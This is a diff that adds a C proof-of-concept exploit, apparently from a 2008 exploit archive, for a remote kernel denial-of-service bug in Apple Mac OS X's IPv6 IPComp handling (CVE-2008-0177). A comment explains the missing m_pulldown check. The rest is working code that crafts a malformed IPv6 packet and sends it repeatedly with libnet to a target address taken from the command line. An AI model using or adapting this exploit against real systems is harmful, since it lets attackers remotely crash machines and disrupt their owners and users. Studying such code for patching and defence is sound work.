@@ -1,0 +1,143 @@
+/* xnu-ipv6-ipcomp.c
+ *
+ * Copyright (c) 2008 by <mu-b@digit-labs.org>
+ *
+ * Apple MACOS X xnu <= 1228.3.13 ipv6-ipcomp remote kernel DoS POC
+ * by mu-b - Sun 24 Feb 2008
+ *
+ * - Tested on: Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
+ *              Apple MACOS X 10.5.2 (xnu-1228.3.13~1/RELEASE_I386)
+ *
+ * ipcomp6_input does not verify the success of the first call
+ * to m_pulldown (m -> md typo?).
+ *
+ *         md = m_pulldown(m, off, sizeof(*ipcomp), NULL);
+ *         if (!m) {
+ * ->
+ *         md = m_pulldown(m, off, sizeof(*ipcomp), NULL);
+ *         if (!md) {
+ *                                    (bsd/netinet6/ipcomp_input.c)
+ *
+ * curiosly the same bug exists in ipcomp4_input, but an explicit
+ * check is made to ensure there is enough space for the struct ipcomp.
+ *
+ * Note: bug independently found by Shoichi Sakane of the KAME project.
+ *       (FreeBSD 5.5, 4.9.0 & NetBSD 3.1 also vulnerable)
+ *          (http://www.kb.cert.org/vuls/id/110947)
+ *          (http://www.securityfocus.com/bid/27642)
+ *          (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0177)
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <arpa/inet.h>
+#include <ifaddrs.h>
+#include <libnet.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#define IPV6_INTERFACE    "eth0"
+#define IPV6_SRC_OFFSET   8
+#define IPV6_DST_OFFSET   24
+
+#define HAMMER_NUM        8
+
+static unsigned char pbuf[] = 
+  "\x60"
+  "\x00\x00\x00"
+  "\x00\x00"      /* plen = 0           */
+  "\x6c"          /* nxt_hdr = IPComp   */
+  "\x66"
+  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+
+static int
+get_localip (char *if_name, unsigned int *ip6_addr)
+{
+  struct ifaddrs *ifa_head;
+  int result;
+
+  result = -1;
+  if (getifaddrs (&ifa_head) == 0)
+    {
+      struct ifaddrs *ifa_cur;
+
+      ifa_cur = ifa_head;
+      for (ifa_cur = ifa_head; ifa_cur; ifa_cur = ifa_cur->ifa_next)
+        {
+          if (ifa_cur->ifa_name != NULL && ifa_cur->ifa_addr != NULL)
+            {
+              if (strcmp (if_name, (char *) ifa_cur->ifa_name) != 0 ||
+                  ifa_cur->ifa_addr->sa_family != AF_INET6 ||
+                  !(ifa_cur->ifa_flags & IFF_UP))
+                continue;
+
+              memcpy (ip6_addr,
+                      &(((struct sockaddr_in6 *) ifa_cur->ifa_addr)->sin6_addr),
+                      sizeof (int) * 4);
+              result = 0;
+              break;
+            }
+        }
+
+      freeifaddrs (ifa_head);
+    }
+
+  return (result);
+}
+
+int
+main (int argc, char **argv)
+{
+  char errbuf[LIBNET_ERRBUF_SIZE], ip6_buf[128];
+  unsigned int i, ip6_addr[4];
+  libnet_t *lnsock;
+
+  printf ("Apple MACOS X xnu <= 1228.3.13 ipv6-ipcomp remote kernel DoS PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  if (argc < 2)
+    {
+      fprintf (stderr, "Usage: %s <dst ipv6>\n", argv[0]);
+      exit (EXIT_FAILURE);
+    }
+
+  if (get_localip (IPV6_INTERFACE,
+                   (unsigned int *) &pbuf[IPV6_SRC_OFFSET]) < 0)
+    {
+      fprintf (stderr, "* get_localip() failed\n");
+      exit (EXIT_FAILURE);
+    }
+
+  if (inet_pton (AF_INET6, argv[1], ip6_addr) <= 0)
+    {
+      fprintf (stderr, "* inet_pton() failed\n");
+      exit (EXIT_FAILURE);
+    }
+  memcpy (&pbuf[IPV6_DST_OFFSET], ip6_addr, sizeof ip6_addr);
+
+  lnsock = libnet_init (LIBNET_RAW6_ADV, NULL, errbuf);
+  if (lnsock == NULL)
+    {
+      fprintf (stderr, "* libnet_init() failed: %s\n", errbuf);
+      exit (EXIT_FAILURE);
+    }
+
+  inet_ntop (AF_INET6, &pbuf[IPV6_SRC_OFFSET], ip6_buf, sizeof ip6_buf);
+  printf ("* local ipv6 %s...\n", ip6_buf);
+  printf ("* attacking %s...", argv[1]);
+  for (i = 0; i < HAMMER_NUM; i++)
+    libnet_write_raw_ipv6 (lnsock, pbuf, sizeof pbuf - 1);
+  printf ("done\n");
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2008-02-26]
